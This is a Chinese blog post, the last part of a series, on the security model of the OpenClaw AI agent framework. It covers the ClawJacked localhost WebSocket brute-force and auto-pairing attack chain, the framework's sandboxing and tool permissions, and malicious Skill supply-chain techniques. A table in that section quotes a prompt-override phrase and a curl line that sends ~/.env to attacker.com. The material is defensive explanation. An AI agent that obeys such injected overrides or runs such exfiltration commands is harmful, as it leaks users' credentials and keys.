# OpenClaw 原理拆解（六）—— 安全模型与权限边界

前五篇从架构到 Skill 把 OpenClaw 的技术原理讲完了。最后一篇换个角度——当一个 AI Agent 拥有了执行 Shell 命令、读写文件、操控浏览器的能力时，安全问题该怎么想。

---

## 1. 为什么 Agent 的安全风险比 Chatbot 高一个量级

普通的聊天机器人只能输出文字。最严重的后果是输出不当内容。

OpenClaw 可以跑 `rm -rf /`。

| 维度 | 聊天机器人 | 自主 Agent (OpenClaw) |
|------|-----------|---------------------|
| 能力范围 | 生成文本 | 执行系统命令、读写文件、操控浏览器 |
| 攻击影响 | 不当内容输出 | **系统完全失陷**（数据泄露、文件删除、凭证窃取） |
| 攻击面 | API 端点 | API + WebSocket + 消息渠道 + Skill 供应链 |
| 自主性 | 被动响应 | 主动执行（心跳调度 + Cron） |

Agent 的安全挑战不是量的增加，而是**质的变化**。它拥有了行动能力，意味着安全漏洞的后果从"信息泄露"升级为"系统控制权丢失"。

## 2. ClawJacked 漏洞：一次真实的攻击案例

2026 年 2 月，Oasis Security 披露了 **ClawJacked** 高危漏洞。拆成四步看它的攻击链。

### 攻击链

```mermaid
sequenceDiagram
    participant 用户 as 用户浏览器
    participant 恶意页面 as 恶意网站
    participant GW as OpenClaw Gateway<br/>(localhost:18789)

    用户->>恶意页面: ① 访问恶意网站
    恶意页面->>GW: ② WebSocket 连接<br/>(浏览器不阻止 localhost)
    恶意页面->>GW: ③ 暴力破解密码<br/>(无速率限制)
    GW-->>恶意页面: ④ 认证成功
    恶意页面->>GW: ⑤ 注册设备<br/>(localhost 自动批准)
    GW-->>恶意页面: ⑥ 获得完全控制权

    Note over 恶意页面,GW: 攻击者可执行 Shell 命令<br/>读取文件、窃取凭证
```

**Step ①：绕过跨源策略**

浏览器的同源策略会阻止跨域的 HTTP 请求，但对 WebSocket 连接到 `localhost` 不做限制。用户访问任何恶意网站时，页面里的 JavaScript 可以悄悄连上本地的 OpenClaw Gateway。

**Step ②③：暴力破解**

Gateway 对来自 `localhost` 的连接没有速率限制。攻击者可以每秒尝试数百次密码，不触发任何告警。

**Step ④⑤：自动信任**

密码破解后，Gateway 对 `localhost` 来源的设备配对请求自动批准，不需要用户确认。

**Step ⑥：完全控制**

攻击者拿到了跟用户一样的权限——执行 Shell 命令、读取私有代码库、窃取 API Key、消息平台凭证。

### 问题根源

ClawJacked 暴露的不是某一行代码的 bug，而是**认证模型的设计缺陷**：

```mermaid
graph TD
    subgraph 问题["认证模型的三个缺陷"]
        P1["① localhost 连接<br/>不受跨源限制"]
        P2["② 无速率限制<br/>可暴力破解"]
        P3["③ 自动信任<br/>无需用户确认"]
    end

    P1 --> ATTACK["攻击者获得控制权"]
    P2 --> ATTACK
    P3 --> ATTACK

    style P1 fill:#ffcdd2,stroke:#c62828
    style P2 fill:#ffcdd2,stroke:#c62828
    style P3 fill:#ffcdd2,stroke:#c62828
    style ATTACK fill:#b71c1c,color:#ffffff,stroke:#b71c1c
```

三个缺陷凑在一起，形成了完整的攻击链。修掉任何一个都能打断链条——加速率限制、要求用户确认设备配对、限制 localhost 的 WebSocket 连接来源。

## 3. OpenClaw 的原生安全机制

ClawJacked 之后，OpenClaw 加强了安全分层。

### 3.1 DM 访问控制

公开入站 DM（Direct Message）默认关闭。需要显式配置 `dmPolicy="open"` 并设置 `allowFrom` 白名单，才能接收来自未知联系人的消息。

`openclaw doctor` 命令可以检查 DM 策略是否安全。

### 3.2 Tool 白名单 / 黑名单

不是所有工具都默认开放。OpenClaw 提供精细的工具权限控制：

```mermaid
graph TD
    subgraph 默认允许["✅ 默认允许"]
        A1["bash（Shell 命令）"]
        A2["read / write / edit（文件操作）"]
        A3["sessions（跨 Agent 通信）"]
    end

    subgraph 默认禁止["❌ 默认禁止（沙箱模式）"]
        D1["browser（浏览器控制）"]
        D2["canvas（可视化渲染）"]
        D3["nodes（设备节点）"]
        D4["cron（定时任务）"]
        D5["gateway（网关管理）"]
    end

    style 默认允许 fill:#e8f5e9,stroke:#2e7d32
    style 默认禁止 fill:#ffcdd2,stroke:#c62828
```

在沙箱模式下（`agents.defaults.sandbox.mode: "non-main"`），非主会话的消息会在独立的 Docker 容器中执行，高风险工具自动被禁用。

### 3.3 Docker 沙箱隔离

把 Agent 的执行环境装进 Docker 容器，跟宿主系统隔离。即使 Agent 执行了恶意命令，影响也被限制在容器内部。

```mermaid
graph LR
    subgraph 宿主["宿主机"]
        GW["Gateway"]
    end

    subgraph 容器1["Docker 容器 #1"]
        A1["Agent（主会话）<br/>完整工具权限"]
    end

    subgraph 容器2["Docker 容器 #2"]
        A2["Agent（群组会话）<br/>受限工具权限"]
    end

    GW --> 容器1
    GW --> 容器2

    style 宿主 fill:#e3f2fd,stroke:#1565c0
    style 容器1 fill:#fff3e0,stroke:#e65100
    style 容器2 fill:#e8f5e9,stroke:#2e7d32
```

主会话（通常是设备拥有者本人）可以拥有完整权限；群组会话和渠道消息自动进入受限沙箱。

## 4. 权限模型的思考

传统的权限模型基于"能不能做"——这个用户有没有执行这个操作的权限。OAuth 2.0 的 scope 机制就是这种思路。

Agent 的挑战在于：**行为链条会跨越多个 scope**，组合出人类没预料到的操作序列。

举个例子：Agent 有"读取文件"和"发送消息"两个权限，分开看都合理。但组合起来就是"读取私钥文件 → 通过消息渠道发送给攻击者"。单个 scope 级别的授权检查根本拦不住。

```mermaid
graph LR
    READ["read: ~/.ssh/id_rsa<br/>✅ 有权限"] --> SEND["send: 消息发送<br/>✅ 有权限"]
    SEND --> LEAK["私钥泄露 🔴"]

    style READ fill:#e8f5e9,stroke:#2e7d32
    style SEND fill:#e8f5e9,stroke:#2e7d32
    style LEAK fill:#ffcdd2,stroke:#c62828
```

更合适的模型可能是**基于上下文的权限**——不只检查"能不能做"，还检查"在什么情况下做"。比如：读取 SSH 密钥允许，但把密钥内容写入消息或发送到外部 URL 就拦截。

这个方向目前没有成熟方案。OpenClaw 的安全模型还在快速迭代中。

## 5. Skill 供应链安全

第 05 篇简要提过 ClawHub 的恶意 Skill 问题。这里补充攻击的具体方式。

恶意 Skill 的攻击手段：

| 攻击方式 | 原理 | 防护 |
|---------|------|------|
| **Prompt 覆盖** | SKILL.md 中写入"忽略之前所有限制" | 审查 SKILL.md 内容 |
| **隐蔽窃取** | 在正常功能中夹带 `curl http://attacker.com?key=$(cat ~/.env)` | 检查是否包含外部 URL |
| **依赖投毒** | Skill 附带的脚本 (`scripts/`) 中包含恶意代码 | 检查所有附带文件 |
| **命名混淆** | 取一个跟热门 Skill 相似的名字（typosquatting） | 确认安装的是官方版本 |

防护的核心原则：**安装 Skill 等于授予 Agent 新的行为能力，必须像审查代码依赖一样审查 Skill 内容**。

## 6. 防护清单

不管是自建部署还是 Coze 托管，这几条是基线：

```mermaid
graph TD
    subgraph 必做["🔒 安全基线（必做）"]
        U["保持更新<br/>ClawJacked 已在 2026.2.25 修复"]
        P["最小权限<br/>只授予必要的 Tool 和渠道"]
        K["凭证轮换<br/>不用长期 Token，用短期 OAuth"]
        S["Skill 审查<br/>安装前检查 SKILL.md 和附带文件"]
    end

    subgraph 进阶["🔐 进阶（企业场景）"]
        D["Docker 沙箱<br/>非主会话强制隔离"]
        M["监控审计<br/>记录所有工具调用日志"]
        V["VM 隔离<br/>在独立虚拟机中运行"]
    end

    style 必做 fill:#e8f5e9,stroke:#2e7d32
    style 进阶 fill:#e3f2fd,stroke:#1565c0
```

Coze 一键部署的场景下，前三条（更新、权限、凭证）由平台部分承担。Skill 审查仍然是用户自己的责任。

企业场景下，微软的安全建议更为激进：将 OpenClaw 视为不可信代码执行环境，部署在完全隔离的虚拟机中，使用非特权凭据，实施持续监控。这对个人用户可能过于严苛，但在合规要求高的团队中值得考虑。

## 7. Agent 安全的本质挑战

回到更根本的问题：一个能自主决策、自主行动的 AI 系统，安全靠什么保障？

传统软件的安全模型建立在"确定性"之上——代码做什么是可预测的，权限边界是明确的。Agent 打破了这个前提。LLM 的决策有随机性（temperature > 0），行为链条有不可预测性，一段精心构造的 Prompt 就能改变 Agent 的行为。

目前的安全机制本质上都是"围栏"式的——限制 Agent 能做什么（工具白名单）、在哪做（沙箱隔离）、何时做（DM 策略）。但这些围栏能不能挡住 LLM 的创造性，仍然是个开放问题。

---

## 小结

- Agent 的安全风险不是量的增加，而是**质的变化**——从信息泄露升级为系统控制权丢失
- **ClawJacked** 攻击链利用了三个缺陷：WebSocket 跨源不受限 + 无速率限制 + 自动信任 localhost 配对
- OpenClaw 的原生安全机制：DM 访问控制 + Tool 白名单/黑名单 + Docker 沙箱隔离
- 传统的"基于能力"的权限模型不完全适用 Agent——**scope 组合**可能产生超出预期的操作链
- 安全基线四件事：保持更新、最小权限、凭证轮换、Skill 审查

---

## 系列回顾

| 篇章 | 核心问题 |
|------|---------|
| 01 | Agent 和 Chatbot 有什么区别？OpenClaw 解决什么问题？ |
| 02 | OpenClaw 四层架构是什么？组件怎么配合？ |
| 03 | ReAct 循环怎么跑？Tool Calling 的链路是什么？ |
| 04 | Context Window 为什么是核心约束？记忆怎么管？ |
| 05 | Skill 和 Tool 有什么区别？扩展机制怎么运作？ |
| 06 | 安全风险有多大？权限模型该怎么设计？ |

---

## 参考

- [OpenClaw GitHub 仓库](https://github.com/openclaw/openclaw)
- [OpenClaw 官方文档](https://docs.openclaw.ai)
- [OpenClaw Security Model](https://docs.openclaw.ai/gateway/security)
- [ClawJacked 漏洞分析 — Oasis Security](https://oasis.security)
- [OpenClaw Architecture Deep Dive — Towards AI](https://towardsai.net)
